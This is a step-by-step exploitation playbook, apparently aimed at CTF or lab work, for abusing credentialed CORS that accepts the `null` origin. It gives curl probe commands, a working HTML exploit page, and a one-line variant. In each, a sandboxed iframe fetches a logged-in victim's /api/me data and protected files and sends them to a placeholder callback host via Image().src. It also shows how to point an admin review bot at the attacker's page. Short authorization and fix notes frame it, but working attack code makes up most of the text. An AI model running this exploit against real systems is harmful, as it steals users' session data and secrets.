# Sandbox Null-Origin Credentialed CORS Exfil

## Context

Use when:

- an authenticated endpoint reflects `Access-Control-Allow-Origin: null`
- the response also includes `Access-Control-Allow-Credentials: true`
- a review/admin bot can be sent to an attacker-hosted page
- the secret may be in JSON (`/api/me`) or a protected file (`/poster.svg`, `/api/secret`, etc.)

## Requirements

- Authorized lab, owned app, in-scope target, or defensive validation.
- Do not store live flags, cookies, tokens, or private callback URLs in reusable files.

## CORS Probe

```bash
curl -sI -H "Origin: null" "https://[host]/api/me"
curl -sI -H "Origin: null" "https://[host]/poster.svg"
curl -sI -H "Origin: https://evil.example" "https://[host]/api/me"
```

Look for:

```http
access-control-allow-origin: null
access-control-allow-credentials: true
```

## Minimal Exploit Page

```html
<!doctype html>
<html><body>
<iframe sandbox="allow-scripts" srcdoc="
&lt;script&gt;
const O='https://[callback]';
const T='https://[host]';
function exfil(path, data) {
  (new Image()).src = O + '/' + path + '?' + encodeURIComponent(data);
}
fetch(T + '/api/me', {credentials:'include'})
  .then(r =&gt; r.text())
  .then(t =&gt; exfil('me', t))
  .catch(e =&gt; exfil('meerr', String(e)));
fetch(T + '/poster.svg', {credentials:'include'})
  .then(r =&gt; r.text())
  .then(t =&gt; exfil('svg', t))
  .catch(e =&gt; exfil('svgerr', String(e)));
&lt;/script&gt;
"></iframe>
</body></html>
```

## Trigger Review Bot

```bash
curl -s -b "session=$SESSION" -X POST "https://[host]/api/report" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://[exploit-host]/"}'
```

## Expected Signal

- Callback receives admin identity from `/api/me`
- Callback receives protected file body from endpoints like `/poster.svg`
- Flag may be embedded as text nodes inside SVG or other markup

## Why `Image().src`

- Works from sandboxed contexts without needing CORS on the callback host
- Avoids preflight complications for simple GET exfil
- More reliable than `fetch()` to OAST in some lab setups

## Variants

### Single-endpoint proof

```javascript
fetch('https://[host]/api/me', {credentials:'include'})
  .then(r => r.text())
  .then(t => (new Image()).src = 'https://[callback]/?' + encodeURIComponent(t));
```

### Add more sensitive routes

Probe and include any route that returns CORS for `Origin: null`:

```text
/api/profile
/api/secret
/api/admin
/private/flag
```

## Common Failures

| Failure | Likely cause |
|---|---|
| No callback hit | bot blocked, bad report endpoint, exploit host down |
| `meerr` only | cookies not sent to target from sandbox context |
| Admin JSON but no flag | secret is on a different endpoint such as SVG/file route |
| CORS works locally but not in bot | testing attacker session instead of victim browser |

## Defensive Note

Fix is server-side: remove `null` from credentialed CORS allowlists and stop exposing secrets on CORS-enabled authenticated routes.
